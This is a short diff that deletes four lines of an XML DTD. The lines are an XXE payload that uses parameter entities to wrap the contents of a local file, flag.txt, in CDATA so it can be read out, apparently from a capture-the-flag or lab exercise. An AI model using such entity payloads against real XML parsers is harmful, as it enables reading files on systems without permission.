@@ -1,4 +1,0 @@
-<!ENTITY % start "<!CDATA[">
-<!ENTITY % stuff SYSTEM "file:///flag.txt">
-<!ENTITY % end "]]>">
-<!ENTITY attack "%start;%stuff;%end;">
